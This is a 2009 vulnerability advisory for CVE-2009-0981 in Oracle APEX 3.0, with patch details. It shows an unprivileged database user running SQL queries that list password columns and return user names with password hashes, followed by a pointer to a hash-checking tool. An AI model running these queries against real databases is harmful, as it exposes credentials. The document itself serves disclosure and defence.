@@ -1,0 +1,76 @@
+Unprivileged DB users can see APEX password hashes in FLOWS_030000.WWV_FLOW_USER [CVE-2009-0981]
+
+Name 			Unprivileged DB users can see APEX password hashes in FLOWS_030000.WWV_FLOW_USER [CVE-2009-0981]
+Systems Affected 	APEX 3.0 (optional component of 11.1.0.7 installation)
+Severity 		High Risk
+Category 		Password Disclosure
+Vendor URL 		http://www.oracle.com/
+Author 			Alexander Kornbrust (ak at red-database-security.com)
+CVE 			CVE-2009-0981
+Advisory 		14 April 2009 (V 1.00)
+
+
+Details
+Unprivileged database users can see APEX password hashes in FLOWS_030000.WWV_FLOW_USER.
+Tested on 11.1.0.7.
+
+C:\> sqlplus dummy/dummy
+Connected to:
+Oracle Database 11g Enterprise Edition Release 11.1.0.7.0 - Production
+With the Partitioning, OLAP, Data Mining and Real Application Testing options
+
+SQL> select granted_role from user_role_privs;
+
+GRANTED_ROLE
+------------------------------
+CONNECT
+
+
+SQL> select owner,table_name from all_tables where owner='FLOWS_030000';
+
+OWNER TABLE_NAME
+------------------------------ ------------------------------
+FLOWS_030000 WWV_FLOW_DUAL100
+FLOWS_030000 WWV_FLOW_LOV_TEMP
+FLOWS_030000 WWV_FLOW_TEMP_TABLE
+
+
+
+Get a list of all columns containing the string "%PASSWORD%'
+
+SQL> select owner||'.'||table_name||'.'||column_name from all_tab_columns where column_name like '%PASSWORD%' and owner like '%FLOWS_0300%';
+
+OWNER||'.'||TABLE_NAME||'.'||COLUMN_NAME
+--------------------------------------------------------------------------------
+FLOWS_030000.WWV_FLOW_USERS.CHANGE_PASSWORD_ON_FIRST_USE
+FLOWS_030000.WWV_FLOW_USERS.FIRST_PASSWORD_USE_OCCURRED
+FLOWS_030000.WWV_FLOW_USERS.WEB_PASSWORD_RAW
+FLOWS_030000.WWV_FLOW_USERS.WEB_PASSWORD2
+FLOWS_030000.WWV_FLOW_USERS.WEB_PASSWORD
+FLOWS_030000.WWV_FLOW_USERS.PASSWORD_LIFESPAN_DAYS
+FLOWS_030000.WWV_FLOW_USERS.PASSWORD_LIFESPAN_ACCESSES
+FLOWS_030000.WWV_FLOW_USERS.PASSWORD_ACCESSES_LEFT
+FLOWS_030000.WWV_FLOW_USERS.PASSWORD_DATE
+
+9 rows selected.
+
+
+SQL> select user_name,web_password2 from FLOWS_030000.WWV_FLOW_USERS
+
+USER_NAME WEB_PASSWORD2
+--------------------------------------------------------------------------------
+YURI 141FA790354FB6C72802FDEA86353F31
+
+This password hash can be checked using a tool like Repscan.
+
+
+Patch Information
+Apply the patches for Oracle CPU April 2009.
+
+
+History
+13-jan-2009 Oracle published CPU April 2009 [CVE-2009-0981]
+14-apr-2009 Oracle published CPU April 2009 [CVE-2009-0981]
+14-apr-2009 Advisory published
+
+# milw0rm.com [2009-04-16]
